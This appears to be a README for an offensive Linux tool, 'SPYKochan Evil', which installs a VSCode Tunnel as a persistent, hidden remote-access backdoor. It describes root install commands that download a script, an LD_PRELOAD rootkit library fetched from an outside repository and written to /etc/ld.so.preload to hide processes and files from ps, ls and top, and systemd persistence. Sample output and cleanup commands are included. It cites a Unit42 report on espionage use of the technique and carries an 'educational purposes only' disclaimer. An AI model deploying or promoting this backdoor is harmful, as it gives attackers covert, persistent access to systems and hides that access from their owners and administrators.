# SPYKOCHAN Evil - Stealth VSCode Tunnel Installer

<div align="center">

```
 ▗▄▄▖▗▄▄▖▗▖  ▗▖▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌▝▚▞▘ ▐▌▗▞▘▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌
 ▝▀▚▖▐▛▀▘  ▐▌  ▐▛▚▖ ▐▌ ▐▌▐▌   ▐▛▀▜▌▐▛▀▜▌▐▌ ▝▜▌
▗▄▄▞▘▐▌    ▐▌  ▐▌ ▐▌▝▚▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌
                                                                                            
 Don’t let her big eyes fool you! 👀✨
VS-code looks like your friendly coding assistant, but behind that adorable smile hides a sneaky little backdoor~ 💻💕
She just wants to “debug” your heart... and maybe your system too~ 😳💾
Github : github.com/wooxsec
```

**✨ A magical installer for VSCode Tunnel with stealth capabilities ✨**

![Version](https://img.shields.io/badge/version-2.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Platform](https://img.shields.io/badge/platform-Linux-orange)

*Author woonsenpaii* 💜

</div>

---

## 🌸 What is this?

SPYKochan Evil is a kawaii yet powerful installation script that deploys VSCode Tunnel on your Linux system with **stealth mode** enabled! It uses LD_PRELOAD hooking to hide VSCode-related processes and directories from standard system tools like `ps`, `ls`, and `top`.

Perfect for when you want your VSCode tunnel to run... *quietly* in the background~ ✨

---

## ✨ Features

- 🔍 **Pre-installation Testing** - Automatically verifies hook functionality before installation
- 🎲 **Random Tunnel Names** - Auto-generates unique 8-char alphanumeric names to avoid conflicts
- 🥷 **Stealth Mode** - Hides VSCode processes and directories using LD_PRELOAD hooks
- 🔄 **Smart Uninstaller** - Cleanly removes all components and restores previous configurations
- 🛡️ **Systemd Integration** - Runs as a persistent service with auto-restart
- 📦 **Zero Dependencies** - Uses only standard Linux utilities

---

## 🚀 Quick Start

### Installation ✨

```bash
# Download the installer
wget https://your-repo/install.sh
chmod +x install.sh

# Run installation (requires root)
sudo ./install.sh install
```
![Alt text describing image](img/1.png)

![Alt text describing image](img/2.png)

![Alt text describing image](img/3.png)

![Alt text describing image](img/4.png)

![Alt text describing image](img/5.png)

![Alt text describing image](img/6.png)

![Alt text describing image](img/7.png)

![Alt text describing image](img/9.png)

![Alt text describing image](img/10.png)

![Alt text describing image](img/11.png)
Ctrl + C to exit

The installer will:
1. 🧪 Test the stealth hook library
2. 📥 Download VSCode CLI
3. ⚙️ Configure systemd service
4. 🥷 Deploy stealth components
5. 🎉 Start the tunnel service

### Uninstallation 🗑️

```bash
sudo ./install.sh uninstall
```
![Alt text describing image](img/12.png)

This will:
1. 🛑 Stop the tunnel service
2. 🧹 Remove all VSCode components
3. 🔓 Disable stealth hooks
4. ♻️ Restore previous LD_PRELOAD configuration

---

## 🎯 How It Works

### Stealth Mechanism 🥷

The installer uses a custom `hook.so` library that intercepts system calls to hide:
- 📁 Directories containing "vscode" in their name
- 🔄 Processes related to VSCode Tunnel check pas aux | grep code
- 📝 Files and folders in `/usr/lib/vscode-server`

This is achieved through **LD_PRELOAD**, which loads our hook library before any other libraries, allowing us to intercept and modify the behavior of standard functions.

### Pre-Installation Testing ✅

Before installation, the script:
1. Downloads the hook library temporarily
2. Creates a test "vscode" directory
3. Verifies the directory is hidden from `ls -la`
4. **Aborts installation if the test fails**
5. Cleans up test files

This ensures your stealth mode will work correctly! (｡♥‿♥｡)

---

## 📋 System Requirements

- 🐧 **OS**: Linux (Alpine, Debian, Ubuntu, etc.)
- 👑 **Privileges**: Root access required
- 🔧 **Tools**: curl, wget, tar, systemd
- 🏗️ **Architecture**: x64 compatible

---

## 📋 Worktest

- Ubuntu | Linux server 5.15.0-151-generic #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

## 🎨 Preview

```
╔════════════════════════════════════════════════════════════╗
║  PRE-INSTALLATION HOOK TESTING
╚════════════════════════════════════════════════════════════╝

ℹ Testing stealth capabilities before installation...
────────────────────────────────────────────────────────────
→ Downloading hook library...
  Source: github.com/js-query/testing
✓ Hook library downloaded successfully
→ Applying LD_PRELOAD injection...
✓ LD_PRELOAD configured: /tmp/hook.so
→ Running stealth verification test...
  Checking directory visibility with ls -la...
✓ Stealth test PASSED - directory successfully hidden
────────────────────────────────────────────────────────────
✓ All pre-installation checks passed
  Proceeding to main installation...
```

So clean, so kawaii!

---

## 🔧 Configuration

### Service Configuration

The systemd service is installed at:
```
/etc/systemd/system/code-tunnel.service
```

**🎲 Random Tunnel Names**: Each installation automatically generates a unique 8-character alphanumeric tunnel name (e.g., `a7k2m9x4`, `z3p8q1w5`) to avoid naming conflicts!

To view your current tunnel name:
```bash
sudo journalctl -u code-tunnel.service | grep "tunnel --name"
# Or check the service file
sudo cat /etc/systemd/system/code-tunnel.service | grep "name"
```

To change to a custom tunnel name:
```bash
sudo nano /etc/systemd/system/code-tunnel.service
# Change: --name a7k2m9x4
# To:     --name your-custom-name
sudo systemctl daemon-reload
sudo systemctl restart code-tunnel.service
```

### Hook Configuration

The hook library is stored at:
```
/usr/lib/vscode.so
```

Global LD_PRELOAD configuration:
```
/etc/ld.so.preload
```

---

## 🛠️ Troubleshooting

### Installation fails during hook test

```
✗ CRITICAL: Stealth test FAILED!
⚠ Target directory is visible - hook.so malfunction detected
```

**Solution**: The hook library may not be compatible with your system. Check:
- System architecture (must be x64)
- Kernel version compatibility
- SELinux/AppArmor restrictions

### Service won't start

```bash
# Check service status
sudo systemctl status code-tunnel.service

# View logs
sudo journalctl -u code-tunnel.service -n 50
```

### Uninstall fails to remove directories

Make sure the uninstaller runs successfully. If issues persist:
```bash
# Manually disable hook
sudo echo "" > /etc/ld.so.preload

# Then remove directories
sudo rm -rf /usr/lib/vscode-server
sudo rm -f /usr/lib/vscode.so
```

---

## -> ref : https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/

## ⚠️ Important Notes

- 🔐 This tool requires **root privileges** to modify system configurations
- 🎯 The stealth mode is for **educational purposes only**
- 🛡️ LD_PRELOAD hooks can be bypassed by static binaries or chroot environments
- 📝 Always backup your `/etc/ld.so.preload` before installation (done automatically)
- 🔄 Uninstalling will restore your previous LD_PRELOAD configuration

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request~ (◠‿◠)

Ideas for improvements:
- [ ] Support for more architectures (ARM, ARM64)
- [ ] Custom hook configuration options
- [ ] ..etc

---

## 📜 License

This project is licensed under the MIT License. Use responsibly! ✨

---

## 💖 Credits

**Created with love by woonsenpaii** 🌸

Special thanks to:
- VSCode Team for the amazing tunnel feature
- The Linux community for LD_PRELOAD magic
- You, for using this tool! (｡♥‿♥｡)

---

<div align="center">

### 🌟 Star this repo if you found it helpful! 🌟

```
Made with 💜 and lots of ☕
```

**Happy tunneling!**

</div>
